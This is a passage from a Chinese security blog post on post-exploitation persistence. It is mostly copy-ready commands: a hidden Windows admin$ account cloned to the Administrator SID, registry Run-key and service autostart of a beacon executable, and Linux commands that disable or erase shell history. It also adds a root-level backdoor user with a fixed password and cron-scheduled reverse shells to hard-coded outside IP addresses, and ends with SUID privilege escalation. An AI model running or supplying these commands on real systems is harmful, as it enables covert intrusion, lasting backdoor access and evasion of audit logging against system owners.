+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">Domains\Account\Users\Names<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194627217-20241204151421-l777chq.png" srcset="/img/loading.gif" lazyload alt="image-20240505194627217">​</p>
+<p>右键导出 Names 下的 <code>admin$</code>​ 和其类型对应的 <code>000003E8</code>​  文件夹的 reg（ 桌面是不互通的 ） ：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194815982-20241204151421-quwanrp.png" srcset="/img/loading.gif" lazyload alt="image-20240505194815982">​</p>
+<blockquote>
+<p>删除用户</p>
+</blockquote>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">admin</span>$ /del<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194939393-20241204151421-09aztm3.png" srcset="/img/loading.gif" lazyload alt="image-20240505194939393">​</p>
+<p>这个时候注册表就没有了。</p>
+<blockquote>
+<p>导入注册表</p>
+</blockquote>
+<p>运行刚才导入的两个 reg 文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regedit /s admin.reg<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改注册表</p>
+</blockquote>
+<p>找到 administrator 用户的 SID 复制下来替换我们的 admin$ 的 SID<br>​<img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505195636976-20241204151421-yocw9cs.png" srcset="/img/loading.gif" lazyload alt="image-20240505195636976">​</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505195720748-20241204151421-ez06u10.png" srcset="/img/loading.gif" lazyload alt="image-20240505195720748">​</p>
+<p>这个时候登录界面的 admin$ 就消失了，我们可以直接通过远程桌面进行登录。</p>
+<p>远程登录后会直接进入到 administrator 用户的界面，注意默认情况下，可能只运行一个远程连接，你连接进去可能就是别人正在操作。</p>
+<h3 id="注册表自启动"><a href="#注册表自启动" class="headerlink" title="注册表自启动"></a>注册表自启动</h3><p>注册表相当于Windows下的一个庞大的层次性数据库. 基本上有着系统所有的配置信息 注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着wi ndows 的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系 统中起着核心作用。</p>
+<p>注册表的构成：</p>
+<ul>
+<li>根键：这个称为HKEY…………，某一项的句柄项：附加的文件夹和一个或多个值</li>
+<li>子项：在某一个项（父项）下面出现的项（子项）</li>
+<li>值项：带有一个名称和一个值的有序值，每个项都可包括任何数量的值项，值项由三个部分组成：名称、数据类型和数据。</li>
+</ul>
+<p>注册表的五大跟键：</p>
+<ul>
+<li>HKEY_USERS：保存了存放在本地计算机口令列表中的用户标识和密码列表</li>
+<li>HKEY_CURRENT_USER：该根键包含了本地工作站中存放的当前登录的用户信息</li>
+<li>HKEY_CURRENT_CONFIG：该根键存放着当前用户桌面配置的数据</li>
+<li>HKEY_CLASSES_ROOT：该根键根据windows操作系统中所安装的应用程序的扩展名，来指定文件类型</li>
+<li>HKEY_LOCAL_MACHINE：该根键存放本地计算机的硬件信息</li>
+</ul>
+<p>启动注册表：regedit</p>
+<p>注册表自启动的实现原理：</p>
+<p>windows 提供了专门的开机自启动注册表。在每次开机完成后，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以，只需要在这个注册表键下添加想要设置自启动程序的路径就可以了。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 当前用户即可<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br># 需要有管理员权限<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br></code></pre></td></tr></table></figure>
+
+<p>右键添加一个字符串值，值就是要启动的木马文件：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505213232075-20241204151421-5vvtpmj.png" srcset="/img/loading.gif" lazyload alt="image-20240505213232075">​</p>
+<p>使用命令添加：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># reg add KeyName /v ValueName /t <span class="hljs-built_in">Type</span> /d Data /f<br># reg add 键名 /v 值项名 /t 值项类型 /d 值项数据 /f(强制,不显示选项)<br>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testReg1 /t REG_SZ /d &quot;C:\Users\Administrator\Desktop\beacon_64.exe&quot; /f<br>reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v testReg2 /t REG_SZ /d &quot;C:\Users\Administrator\Desktop\beacon_64.exe&quot; /f<br># 删除<br>reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testReg1 /f<br></code></pre></td></tr></table></figure>
+
+<h3 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h3><p>服务是一种应用程序类型，它在后台运行。服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端&#x2F;服务器应用程序、Web 服务器、数据库服务器以及其他基于服务器的应用程序。</p>
+<p>启动服务命令：services.msc</p>
+<p>想要操作服务需要有管理员权限，在服务启动后会以本地系统权限(system)执行。</p>
+<p>如果帐户具有本地管理员特权，则可以从命令提示符创建服务。参数“ binpath ”用于执行任意有效负载，而参数“ auto ”用于确保恶意服务将自动启动。</p>
+<p>使用 sc 创建服务：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 创建服务<br>sc create &quot;scAutoRunTest&quot; binpath= &quot;<span class="hljs-built_in">cmd</span> /c <span class="hljs-built_in">start</span> /b C:\Users\Public\scAutoRunTest.exe&quot;<br># 设置对服务的描述<br>sc description &quot;scAutoRunTest&quot; &quot;scAutoRunTest&quot;<br># 设置这个服务为自动启动<br>sc config &quot;scAutoRunTest&quot; <span class="hljs-built_in">start</span>=auto<br># 启动服务<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;scAutoRunTest&quot;<br>sc <span class="hljs-built_in">start</span> &quot;scAutoRunTest&quot;<br># 查询服务<br>sc qc scAutoRunTest<br># 删除服务<br>sc delete scAutoRunTest<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sc create &quot;scAutoRunTest&quot; binpath= &quot;<span class="hljs-built_in">cmd</span> /c <span class="hljs-built_in">start</span> /b C:\Users\Administrator\Desktop\beacon_64.exe&quot;&amp;&amp;sc description &quot;scAutoRunTest&quot; &quot;scAutoRunTest&quot;&amp;&amp;sc config &quot;scAutoRunTest&quot; <span class="hljs-built_in">start</span>=auto&amp;&amp;sc <span class="hljs-built_in">start</span> &quot;scAutoRunTest&quot;<br></code></pre></td></tr></table></figure>
+
+<p>使用 powershell 创建服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建服务</span><br>powershell.exe <span class="hljs-built_in">New-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;scAutoRunTest&quot;</span> <span class="hljs-literal">-BinaryPathName</span> <span class="hljs-string">&#x27;cmd /c start /b C:\Users\Administrator\Desktop\beacon_64.exe&#x27;</span> <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;scAutoRunTest&quot;</span> <span class="hljs-literal">-StartupType</span> Automatic<br><span class="hljs-comment"># 查询(sc的也可以)</span><br>powershell.exe <span class="hljs-built_in">Get-Service</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;scAutoRunTest&quot;</span><br><span class="hljs-comment"># 启动服务</span><br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> <span class="hljs-string">&quot;scAutoRunTest&quot;</span><br><span class="hljs-comment"># 删除 (Remove-Service-name有版本限制, 故不常用)</span><br>powershell.exe <span class="hljs-built_in">Remove-Service</span><span class="hljs-literal">-name</span> <span class="hljs-string">&quot;scAutoRunTest&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>SharPersist 创建系统服务（ Cobalt Strike 中的 ）&#x3D;&gt; 没复现成功：</p>
+<p>SharPersist 支持在系统中创建新服务的持久性技术。在系统上安装新服务需要本地管理员的访问权限，该服务将在 Windows 启动后以本地系统执行。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 添加 SC 服务<br>execute-assembly C:\Users\Administrator\Desktop\artifact.exe -t service -c &quot;C:\Windows\System32\<span class="hljs-built_in">cmd</span>.exe&quot; -a &quot;/c C:\Users\Public\scAutoRunTest.exe&quot; -n &quot;scAutoRunTest&quot; -m add<br># 查询 SC 服务<br>execute-assembly /root/SharPersist.exe -t service -m list -n &quot;scAutoRunTest&quot;<br># 删除 SC 服务<br>execute-assembly /root/SharPersist.exe -t service -n &quot;scAutoRunTest&quot; -m remove<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505222517335-20241204151421-ht8od0v.png" srcset="/img/loading.gif" lazyload alt="image-20240505222517335">​</p>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="隐蔽操作"><a href="#隐蔽操作" class="headerlink" title="隐蔽操作"></a>隐蔽操作</h3><p>进入 linux 系统第一步，设置不记录系统命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0<br><br>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure>
+
+<p>SSH 连接隐身：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -T root@xxx.xxx.xxx.xxx /bin/bash -i <br></code></pre></td></tr></table></figure>
+
+<p>清除当前历史记录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">清楚当前会话的命令历史记录</span><br>history -r<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者 不给当前的shell留时间去处理，内存的命令也没时间写入到文件</span><br>kill -9 $$<br></code></pre></td></tr></table></figure>
+
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><blockquote>
+<p>tommy</p>
+<p>QWEasd@123</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;tommy:x:0:0::/:/bin/bash&quot; &gt;&gt; /etc/passwd<br><br>echo &quot;tommy:x:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd<br>echo &quot;QWEasd@123&quot; | passwd --stdin tommy<br>echo -e &quot;QWEasd@123\nQWEasd@123&quot; | passwd tommy<br><br>echo &quot;tommy:x:0:0::/:/bin/bash&quot; &gt;&gt; /etc/passwd &amp;&amp; echo -e &quot;QWEasd@123\nQWEasd@123&quot; | passwd tommy<br><br><br>useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; QWEasd@123` tommy -o -u 0 -g root -G root -s /bin/bash -d /home/tommy<br></code></pre></td></tr></table></figure>
+
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">反弹 shell 脚本</span><br>vim /etc/.bshell.sh <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/45.32.179.170/3333 0&gt;&amp;1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>if ! ps aux | grep -q &quot;[s]liver&quot;; then<br>    /usr/bin/sliver<br>fi<br><br>chmod +x /etc/.bshell.sh <br>vim /etc/crontab<br>echo &quot;*/10 * * * * root /etc/.bshell.sh&quot; &gt;&gt; /etc/crontab<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/136.244.76.249/443 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>原理就是 SUID 提权，给 find 或其他命令加权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +s /usr/bin/find<br><br>find /etc/passwd -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;command&quot;</span> \;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>权限维持</div>
+      <div>https://liancccc.github.io/2024/09/15/技术/内网渗透/权限维持/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>守心</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/" title="数据传输">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">数据传输</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" title="隧道代理">
+                        <span class="hidden-mobile">隧道代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
